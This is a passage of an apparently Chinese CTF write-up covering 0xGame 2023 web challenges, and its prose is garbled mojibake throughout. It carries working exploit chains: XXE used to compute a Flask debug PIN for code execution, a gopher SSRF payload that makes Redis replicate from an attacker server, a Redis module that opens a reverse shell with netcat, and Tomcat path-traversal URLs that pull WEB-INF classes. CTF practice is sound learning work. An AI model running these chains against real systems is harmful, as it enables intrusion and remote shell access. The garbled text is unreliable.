    tree = etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=True))\n\n        result = {}\n\n        rss_title = tree.find('/channel/title').text\n        rss_link = tree.find('/channel/link').text\n        rss_posts = tree.findall('/channel/item')\n\n        result['title'] = rss_title\n        result['link'] = rss_link\n        result['posts'] = []\n\n        if len(rss_posts) >= 10:\n            rss_posts = rss_posts[:10]\n\n        for post in rss_posts:\n            post_title = post.find('./title').text\n            post_link = post.find('./link').text\n            result['posts'].append({'title': post_title, 'link': unquote(post_link)})\n \n        return render_template('index.html', feed_url=feed_url, result=result)\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=True)\n```\n\nç®€å•å®¡è®¡\n\nå¤§è‡´æ€è·¯ä¸ºå®ƒä¼šé€šè¿‡httpåè®®å»è®¿é—®ä¸€ä¸ªç½‘ç«™ ç„¶åå°†å…¶è®¿é—®åˆ°çš„å†…å®¹é€šè¿‡xmlè§£æå‡ºæ¥ ç„¶åæ­£åˆ™åŒ¹é…ç›¸å…³çš„å†…å®¹ ç„¶åå¸®æˆ‘ä»¬æ¸²æŸ“å‡ºæ¥\n\n`resolve_entities=True`é‡ç‚¹å…³æ³¨è¿™ä¸ª å¦‚æœè¿™ä¸ªé€‰é¡¹è¢«è®¾ç½®ä¸ºäº†true é‚£ä¹ˆå®ƒå°±ä¼šå¸®æˆ‘ä»¬è§£æxmlå®ä½“\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598725169-4234b27f-2cd7-4f45-9a3d-a74ee5c59a88.png)\n\næ¥è‡ªï¼š[python_code_audit/XXE.md at master Â· MisakiKata/python_code_audit](https://github.com/MisakiKata/python_code_audit/blob/master/XXE.md)\n\né™¤æ­¤ä¹‹å¤–`debug=True`è¿™æ„å‘³ç€ å¦‚æœæˆ‘ä»¬èƒ½è®¡ç®—å‡ºpinå€¼ æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡`/console`ç›´æ¥è¿›è¡Œrce\n\næ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯:\n\n1. ç”¨vpsèµ·ä¸€ä¸ªpython httpæœåŠ¡ ç„¶åæŠŠæœ‰æ¶æ„å†…å®¹çš„xmlæ–‡ä»¶æ”¾å…¶ç›®å½•ä¸­\n2. è®¿é—® è¯»å–ç›¸å…³è®¡ç®—pinç çš„æ–‡ä»¶\n3. rce\n\nxmlæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598961969-50ab931f-47fc-41ad-87bd-af42dac22163.png)\n\nèµ·httpæœåŠ¡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598998390-a5a202e2-73c9-4947-bc4d-21ebe510f301.png)\n\nè¯»å–åˆ°ç›¸å…³é…ç½®æ–‡ä»¶å†…å®¹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599022319-c2bbeff1-534b-4a27-b482-759dbb2f87fb.png)\n\nç„¶åè¿™é“é¢˜ç›®å…¶å®`/proc/self/cgroup`æ˜¯ç©ºçš„ \n\nåªéœ€è¦è¯»å–`/etc/machine-id`å€¼å°±å¯ä»¥è®¡ç®—machine-idäº†\n\nç„¶åç”¨æˆ·æ˜¯app è·¯å¾„æŠ¥é”™å¾—åˆ°\n\nè®¡ç®—pinç \n\n```javascript\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'app'  # /etc/passwd\n    'flask.app',  # é»˜è®¤å€¼\n    'Flask',  # é»˜è®¤å€¼\n    '/usr/local/lib/python3.9/site-packages/flask/app.py'  # æŠ¥é”™å¾—åˆ°\n]\n\nprivate_bits = [\n    '2485378744322',  # /sys/class/net/eth0/address åè¿›åˆ¶\n    '96cec10d3d9307792745ec3b85c89620'\n    # å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup\n]\n\n# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\nç›´æ¥åå¼¹shell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599162719-3cedc115-53ec-4189-a3dd-c270b67a30c6.png)\n\næ‹¿ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599180240-36084f24-009a-4ce6-9924-a6b4034ae184.png)\n\n## [Week 3] zip_file_manager\n\nè€ƒç‚¹ï¼š\n\n- è½¯é“¾æ¥\n\nç›´æ¥é€šè¿‡è½¯é“¾æ¥å°†æ ¹ç›®å½•ä¸‹çš„flagå‹¾å‡ºæ¥\n\n```javascript\nln -s /flag  test\nzip --symlinks test.zip ./test\n```\n\n## [Week 3] web_snapshot\n\nè€ƒç‚¹ï¼š\n\n- redisä¸»ä»å¤åˆ¶\n- ssrf\n- gopheråè®®\n\nä¸»è¦æºç å¦‚ä¸‹ï¼š\n\nindex.php\n\n```javascript\n<?php\nerror_reporting(0);\n\nfunction _get($url) {\n    $curl = curl_init();\n    curl_setopt($curl, CURLOPT_URL, $url);\n    curl_setopt($curl, CURLOPT_HEADER, 0);\n    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\n    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);\n    $data = curl_exec($curl);\n    curl_close($curl);\n    return $data;\n}\n\nfunction process() {\n    $redis = new Redis();\n    $redis->connect('db', 6379);\n    $redis->slaveOf();\n\n    if (isset($_POST['url'])) {\n        $url = $_POST['url'];\n\n        if (!preg_match('/^https?:\\/\\/.*$/', $url)) {\n            return '<div class=\"alert alert-danger\">Invalid URL! The URL must start with <code>http://</code> or <code>https://</code></div>';\n        }\n\n        $id = md5($url.time());\n        $data = _get($url);\n        $redis->setEx($id, 600, $data);\n\n        return '<div class=\"alert alert-success\">Snapshot success! Link: <a href=\"cache.php?id='.$id.'\">cache.php?id='.$id.'</a></div><h2>Source</h2><pre><code class=\"language-html\">'.htmlspecialchars($data).'</code></pre>';\n    }\n}\n?>\n```\n\nping.php\n\n```javascript\n<?php\nerror_reporting(0);\n\n$redis = new Redis();\n$redis->connect('db', 6379);\n$redis->slaveOf();\n\nif ($redis->ping()) {\n    echo 'pong';\n} else {\n    echo 'Connection error';\n}\n?>\n```\n\ncache.php\n\n```javascript\n<?php\nerror_reporting(0);\n\n$id = $_GET['id'];\n\nif (!preg_match('/^[a-f0-9]{32}$/', $id)) {\n    die('Invalid ID');\n}\n\n$redis = new Redis();\n$redis->connect('db', 6379);\n$redis->slaveOf();\n\n$data = $redis->get($id);\n\nif ($data) {\n    echo $data;\n} else {\n    die('No snapshot found!');\n}\n?>\n```\n\nç®€å•å®¡è®¡å°±èƒ½çœ‹åˆ°index.phpä¸­å­˜åœ¨ssrf å¹¶ä¸”é™åˆ¶äº†åªèƒ½ä»¥http/httpsåè®®\n\nå½“ç„¶curlé™¤äº†http/httpsåè®®å¤–è¿˜æ”¯æŒdict/gopheråè®®\n\nå†æ¥çœ‹`curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018226430-3410ab03-23a4-4712-85ae-d877557cdeb5.png)\n\nå½“å…¶è¢«è®¾ç½®ä¸ºtrueæ—¶ ä¼šæ ¹æ®æœåŠ¡å™¨httpå¤´ä¸­çš„locationè¿›è¡Œé‡å®šå‘\n\näºŒè€…ç»“åˆèµ·æ¥ æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ Location å¤´æŠŠåè®®ä» http é‡å®šå‘è‡³ dict / gopher\n\nå†å®¡è®¡cache.phpå’Œping.phpå¯çŸ¥ webæœåŠ¡å’ŒredisæœåŠ¡ä¸åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018653945-607c1987-eeb6-425d-a26f-f9f4ac81ed90.png)\n\nè¿™å°±å¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç›´æ¥é€šè¿‡å†™å…¥æ–‡ä»¶getshell\n\né‚£ä¹ˆå°±è¦åˆ©ç”¨åˆ°redisä¸»ä»å¤åˆ¶äº† å‚è€ƒï¼š[Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼](https://paper.seebug.org/975/)\n\nRedisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚\n\né€šè¿‡slave ofè®¾ç½®ä¸»ä»çŠ¶æ€\n\nï¼ˆå·çš„å›¾ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699019249350-3254f8ce-2e21-4b7f-aea9-910c889e9878.png)\n\nå¯ä»¥çœ‹åˆ°åœ¨ä¸»æœºä¿®æ”¹å€¼ä¹‹åä¼šåŒæ­¥åˆ°ä»æœºä¸Š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699019683190-a07767fc-c9eb-4ebf-b931-66498429afc1.png)\n\nåˆ©ç”¨åŸç†ï¼š\n\nå½“ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Š\n\nç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»æœºåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†\n\næ•´ä¸ªæµç¨‹å›¾å¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699020700294-a7f0ea3e-324f-4a9c-b88f-3127d90dc3fc.png)\n\né¦–å…ˆå…ˆç”Ÿæˆé‡å®šå‘æ¶æ„æ–‡ä»¶\n\n```javascript\nimport urllib.parse\npoc1= ''' HTTP/1.1\nSLAVEOF ip port\nCONFIG SET dbfilename exp.so\n'''\n#SLAVEOFè®¾ç½®ä¸»æœåŠ¡å™¨ æˆ‘ä»¬è‡ªå·±çš„æ¶æ„æœåŠ¡å™¨\n#CONFIG SET dbfilenameä¸ºæŒ‡å®šä¿å­˜æ–‡ä»¶å\npoc2=''' HTTP/1.1\nMODULE LOAD ./exp.so\nsystem.rev 123 123\n'''\n#module load ./1.so åŠ è½½æ¶æ„æ–‡ä»¶\n# system.revåé¢è¢«Aecouså¸ˆå‚…é­”æ”¹äº†ï¼Œå› ä¸ºå¼¹ä¸äº†shellï¼Œæ­£å¸¸ä½¿ç”¨å°±æ˜¯ip port\npayload = urllib.parse.quote(poc1).replace(\"%0A\", \"%0D%0A\")\npayload = \"gopher://db:6379/\" + payload\nprint(payload)\n```\n\nåœ¨vpsèµ·ä¸ªphpæ–‡ä»¶ç”¨`php -S 0.0.0.0:port`æˆ–è€…ç”¨nginxï¼Œapacheéƒ½è¡Œ\n\nè®©é¢˜ç›®å»ä¾æ¬¡è®¿é—®è¿™ä¸¤ä¸ªæ–‡ä»¶\n\nå†èµ·ä¸ªæ¶æ„redis server æ¨èï¼š[GitHub - Testzero-wz/Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)\n\n æ¶æ„Serverä½¿ç”¨ï¼Œ-vä¸ºæ¶æ„Serveræ¨¡å¼ï¼ŒæŒ‡å®športå’Œæ¶æ„æ–‡ä»¶å¼€å¯ç›‘å¬  \n\n```\n python3 redis_rogue_server.py -v -lport 8888 -path exp.so  \n```\n\nè¿™é‡Œæ¶æ„soæ–‡ä»¶ç”±Aecouså¸ˆå‚…å®Œæˆçš„çœŸçš„tql\n\né­”æ”¹RedisModulesSDK/exp/exp.cä¸€ä¸ªå‡½æ•°ï¼Œmakeç¼–è¯‘åç”Ÿæˆexp.soæ–‡ä»¶  é¡¹ç›®åœ°å€ï¼šhttps://github.com/vulhub/redis-rogue-getshell\n\né­”æ”¹å†…å®¹ä¸ºï¼š\n\n```javascript\nint RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n\tif (argc == 3) {\n\t\tsize_t cmd_len;\n\t\tchar *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);\n\t\tchar *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);\n\t\tint port = atoi(port_s);\n        int pid;\n\t\tchar * succ= \"+OK\";\n\t\tpid = fork();\n\t\tif (pid || pid == -1){\n            RedisModuleString *ret = RedisModule_CreateString(ctx, succ, strlen(succ));\n            RedisModule_ReplyWithString(ctx, ret);\n\t\t    RedisModule_FreeString(ctx,ret);\n\t\t\treturn REDISMODULE_OK;\n\t\t}\n\t\t\n\t\tsystem(\"nc ip port -e sh\");\n\n\t\treturn REDISMODULE_OK;\n\n\t} else {\n                return RedisModule_WrongArity(ctx);\n        }\n    return REDISMODULE_OK;\n}\n```\n\nèµ·server\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021626577-a776f61a-fa6b-459b-93eb-206490ce58ee.png)\n\nè®¿é—®1.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021727894-8443bd61-ea91-4f7b-b794-326911629959.png)\n\næ¶æ„æœåŠ¡å™¨ä¼šæŒç»­é€šä¿¡å†™å…¥  ä¹‹å‰ä»£ç æ²¡æœ‰åŠ quitçš„è¯ ä¼šä¸€ç›´å†™å…¥ ä¸€æ¬¡å°±å¯ä»¥exitå‡ºæ¥äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021678146-2a4ed6cb-e8f0-42b8-96f1-15908af21cca.png)\n\nç„¶åè®¿é—®2.php åŠ è½½æ¶æ„soæ–‡ä»¶ åå¼¹shell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022532071-31554092-63af-4ced-b948-1c312836ed7b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022511568-6c0c449b-443d-4723-bc5d-2855c88e7311.png)\n\n## [Week 3] GoShop\n\nè€ƒç‚¹ï¼š\n\n- æ•´æ•°æº¢å‡º\n\n```javascript\nfunc BuyHandler(c *gin.Context) {\n\ts := sessions.Default(c)\n\tuser := users[s.Get(\"id\").(string)]\n\n\tdata := make(map[string]interface{})\n\tc.ShouldBindJSON(&data)\n\n\tvar product *Product\n\n\tfor _, v := range products {\n\t\tif data[\"name\"] == v.Name {\n\t\t\tproduct = v\n\t\t\tbreak\n\t\t}\n\t}\n\n\tif product == nil {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"No such product\",\n\t\t})\n\t\treturn\n\t}\n\n\tn, _ := strconv.Atoi(data[\"num\"].(string))\n\n\tif n < 0 {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"Product num can't be negative\",\n\t\t})\n\t\treturn\n\t}\n\n\tif user.Money >= product.Price*int64(n) {\n\t\tuser.Money -= product.Price * int64(n)\n\t\tuser.Items[product.Name] += int64(n)\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": fmt.Sprintf(\"Buy %v * %v success\", product.Name, n),\n\t\t})\n\t} else {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"You don't have enough money\",\n\t\t})\n\t}\n}\n```\n\nè¿™é‡Œç›´æ¥çœ‹å®˜æ–¹WPå§ [0xGame 2023 Web Official Writeup](https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/#goshop)\n\næœ¬äººä¹±ç‚¹å‡ºçš„qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022685784-17eab509-7c76-46b8-a5bd-08c61069fd8e.png)\n\n# WEEK4\n\n## [Week 4] spring(å­¦ä¹ )\n\nè€ƒç‚¹ï¼š\n\n- Spring Boot Actuatoræœªæˆæƒ headdumpæ³„éœ²\n\n> Actutatoræ˜¯ä¸€ä¸ªç”Ÿäº§ç¯å¢ƒéƒ¨ç½²æ—¶å¯ä½¿ç”¨çš„åŠŸèƒ½ï¼Œç”¨æ¥ç›‘æ§å’Œç®¡ç†åº”ç”¨ç¨‹åºã€‚æ”¯æŒé€‰æ‹©HTTP Endpoints æˆ–è€…JMXçš„æ–¹å¼æ¥è®¿é—®ï¼ŒåŒæ ·æ”¯æŒæŸ¥çœ‹åº”ç”¨ç¨‹åºçš„Auding,healthå’Œmetricsä¿¡æ¯ã€‚\n\né¦–å…ˆè®¿é—®`/actuator/env `æŸ¥çœ‹ç¯å¢ƒå˜é‡å‘ç°flagæ˜¯å¯†ç  å¯†ç è¢«æ”¹ä¸ºæ˜Ÿå·äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698847740633-7aee6a12-a838-4b4c-8942-1c94351320e3.png)\n\nè®¿é—®`/actuator/headdump` \n\nspring actuator é»˜è®¤ä¼šæŠŠå«æœ‰ password secret ä¹‹ç±»å…³é”®è¯çš„å˜é‡çš„å€¼æ”¹æˆæ˜Ÿå·, é˜²â½Œæ•æ„Ÿä¿¡æ¯æ³„éœ² ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ /actuator/heapdump è¿™ä¸ªè·¯ç”±å»å¯¼å‡º jvm ä¸­çš„å †å†…å­˜ä¿¡æ¯, ç„¶åé€šè¿‡â¼€å®šçš„æŸ¥è¯¢å¾—åˆ° app.password çš„æ˜æ–‡\n\nè¿™é‡Œæˆ‘ç”¨çš„æ˜¯MATå·¥å…·[Eclipse Memory Analyzer Open Source Project | The Eclipse Foundation](https://eclipse.dev/mat/)\n\næŸ¥è¯¢è¯­å¥ï¼š\n\n```\nSELECT * FROM java.util.LinkedHashMap$Entry x WHERE(toString(x.key).contains(\"app.password\"))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698847993233-e8c26d8f-cb19-477c-aaa6-f133fbcfc399.png)\n\n## [Week 4] auth_bypass(å­¦ä¹ )\n\nè€ƒç‚¹ï¼š\n\n- Tomcat Filterç»•è¿‡+javaä»»æ„æ–‡ä»¶ä¸‹è½½æ­é…WEB-INFç›®å½•åˆ©ç”¨\n\næºç å¦‚ä¸‹ï¼š\n\nAuthFilter.java\n\n```javascript\npackage com.example.demo;\n\nimport javax.servlet.*;\nimport javax.servlet.http.HttpServletRequest;\nimport java.io.IOException;\n\npublic class AuthFilter implements Filter {\n\n    @Override\n    public void init(FilterConfig filterConfig)  {\n    }\n\n    @Override\n    public void destroy() {\n    }\n\n    @Override\n    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) req;\n\n        if (request.getRequestURI().contains(\"..\")) {\n            resp.getWriter().write(\"blacklist\");\n            return;\n        }\n\n        if (request.getRequestURI().startsWith(\"/download\")) {\n            resp.getWriter().write(\"unauthorized access\");\n        } else {\n            chain.doFilter(req, resp);\n        }\n    }\n}\n```\n\nDownloadServlet.java\n\n```javascript\npackage com.example.demo;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class DownloadServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n\n        String currentPath = this.getServletContext().getRealPath(\"/assets/\");\n        Object fileNameParameter = req.getParameter(\"filename\");\n        if (fileNameParameter != null) {\n            String fileName = (String) fileNameParameter;\n            resp.setHeader(\"Content-Disposition\",\"attachment;filename=\"+fileName);\n            try (FileInputStream input = new FileInputStream(currentPath + fileName)) {\n                byte[] buffer = new byte[4096];\n                while (input.read(buffer) != -1) {\n                    resp.getOutputStream().write(buffer);\n                }\n            }\n        } else {\n            resp.setContentType(\"text/html\");\n            resp.getWriter().write(\"<a href=\\\"/download?filename=avatar.jpg\\\">avatar.jpg</a>\");\n        }\n    }\n}\n```\n\nç®€å•å®¡è®¡å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„åŠŸèƒ½ å¹¶ä¸”æœ‰blacklist\n\né¦–å…ˆå¦‚ä½•ç»•è¿‡blacklist `..`å’Œå…³é”®å­—`/download`\n\nè¿™é‡Œåˆ©ç”¨äº†javaä¸­ getRequestURI()  çš„ç¼ºé™· è¿™ä¸ªå‡½æ•°åœ¨è§£æurlæ—¶ä¸ä¼šè‡ªåŠ¨è¿›è¡Œurlè§£ç  ä¹Ÿä¸ä¼šè¿›è¡Œæ ‡å‡†åŒ– (å»é™¤å¤šä½™çš„`/å’Œ..`)\n\nå‚è€ƒï¼š[getRequestURI å¯¼è‡´çš„å®‰å…¨é—®é¢˜ - depycode - åšå®¢å›­](https://www.cnblogs.com/depycode/p/16124191.html)\n\n ä»¥ç›´æ¥è®¿é—® `//download `å°±èƒ½ç»•è¿‡ \n\nä¹‹åç›®å½•ç©¿è¶Šä¸‹è½½æ–‡ä»¶çš„æ—¶å€™å¯ä»¥å°†`..` è¿›è¡Œâ¼€æ¬¡ url ç¼–ç  å°±èƒ½ç»•è¿‡\n\næ‰€ä»¥å¯ä»¥é€šè¿‡ `//download?filename=æ–‡ä»¶ `æ¥è¯»å–æ–‡ä»¶ è¿™é“é¢˜ç›®éœ€è¦`./readflag`å› æ­¤ä¸èƒ½ç›´æ¥å°†flagè¯»å‡ºæ¥\n\næ ¹æ®é¢˜ç›®æè¿° ç½‘ç«™ä½¿ç”¨waræ‰“åŒ… \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698850966288-8e5b064d-bdd6-4201-9fbf-a507555dfebd.png)\n\nTomcat åœ¨éƒ¨ç½² war çš„æ—¶å€™ä¼šå°†å…¶è§£å‹, â½½å‹ç¼©åŒ…å†…ä¼šå­˜åœ¨â¼€ä¸ª WEB-INF â½¬å½•, â½¬å½•â¾¥â¾¯åŒ…å«ç¼–è¯‘å¥½çš„ .class â½‚ä»¶ä»¥åŠ web.xml (ä¿å­˜è·¯ç”±å’Œç±»çš„æ˜ å°„å…³ç³» ï¼‰\n\nä¸‹è½½web.xml \n\n```\n//download?filename=%2e%2e/WEB-INF/web.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n    <servlet>\n        <servlet-name>IndexServlet</servlet-name>\n        <servlet-class>com.example.demo.IndexServlet</servlet-class>\n    </servlet>\n    <servlet>\n        <servlet-name>DownloadServlet</servlet-name>\n        <servlet-class>com.example.demo.DownloadServlet</servlet-class>\n    </servlet>\n    <servlet>\n        <servlet-name>EvilServlet</servlet-name>\n        <servlet-class>com.example.demo.EvilServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>IndexServlet</servlet-name>\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n    <servlet-mapping>\n        <servlet-name>DownloadServlet</servlet-name>\n        <url-pattern>/download</url-pattern>\n    </servlet-mapping>\n    <servlet-mapping>\n        <servlet-name>EvilServlet</servlet-name>\n        <url-pattern>/You_Find_This_Evil_Servlet_a76f02cb8422</url-pattern>\n    </servlet-mapping>\n    \n    <filter>\n        <filter-name>AuthFilter</filter-name>\n        <filter-class>com.example.demo.AuthFilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>AuthFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n</web-app>\n```\n\nå¯ä»¥çœ‹åˆ°EvilServletç±»çš„`/You_Find_This_Evil_Servlet_a76f02cb8422`è·¯ç”±\n\n é€šè¿‡åŒ…å (com.example.demo.EvilServlet) æ„é€ å¯¹åº”çš„ class æ–‡ä»¶è·¯å¾„å¹¶ä¸‹è½½  \n\n```\n //download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class  \n```\n\nå†åˆ©ç”¨JD-GUIå·¥å…·è¿›è¡Œåç¼–è¯‘æ‰“å¼€\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851238943-8816e84f-6fd8-4cbc-aae1-3b4f8fca29f1.png)\n\nå‘ç°å‘½ä»¤æ‰§è¡Œåˆ©ç”¨ç‚¹\n\nåˆ©ç”¨è¿™ä¸ªå·¥å…·ç”Ÿæˆpaylaod [java.lang.Runtime.exec() Payload Workarounds - @Adminxe](https://www.adminxe.com/tools/code.html)\n\nè®°å¾—postæ‰“å…¥çš„æ—¶å€™urlå…¨å­—ç¬¦ç¼–ç ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851481677-b3dfcc4a-c183-4962-bef1-09eff8959608.png)\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851514653-3583acc0-72de-445b-b3ac-02fcbd63e7b7.png)\n\n\n\n## [Week 4] YourBatis(å­¦ä¹ )\n\nè€ƒç‚¹ï¼š\n\n- MyBatisä½ç‰ˆæœ¬OGNLæ³¨å…¥\n-  OGNL è¡¨è¾¾å¼æ³¨å…¥\n\né¦–å…ˆå°†ç»™çš„jaråŒ…è¿›è¡Œåç¼–è¯‘ åœ¨ideaæ‰“å¼€\n\né¦–å…ˆæŸ¥çœ‹ä¾èµ– å‘ç°å­˜åœ¨MyBatisä¾èµ– å¹¶ä¸”æ˜¯ä½ç‰ˆæœ¬2.1.1 è¯¥ç‰ˆæœ¬å­˜åœ¨OGNLè¡¨è¾¾å¼æ³¨å…¥\n\nä¹‹åå¼€ä¸ªç¯‡ç« å­¦ä¹ ä¸€ä¸‹ WPå°±ä¸è¿‡å¤šèµ˜è¿°äº†\n\næ¨èï¼š[å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-ä»ä¸€é“CTFé¢˜æµ…è°ˆMyBatisä¸Ognlçš„é‚£äº›äº‹](https://forum.butian.net/share/1749)[Mybatis ä»SQLæ³¨å…¥åˆ°OGNLæ³¨å…¥ - panda | çƒ­çˆ±å®‰å…¨çš„ç†æƒ³å°‘å¹´](https://www.cnpanda.net/sec/1227.html)\n\nå­˜åœ¨ä¸€ä¸ª/userè·¯ç”± \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699177350194-f8a3b765-c6f6-43ac-a960-ba1e8243dda6.png)\n\nä¸»è¦ä»£ç å¦‚ä¸‹\n\n```javascript\n//\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\npackage com.example.yourbatis.provider;\n\nimport org.apache.ibatis.jdbc.SQL;\n\npublic class UserSqlProvider {\n    public UserSqlProvider() {\n    }\n\n    public String buildGetUsers() {\n        return (new SQL() {\n            {\n                this.SELECT(\"*\");\n                this.FROM(\"users\");\n            }\n        }).toString();\n    }\n\n    public String buildGetUserByUsername(final String username) {\n        return (new SQL() {\n            {\n                this.SELECT(\"*\");\n                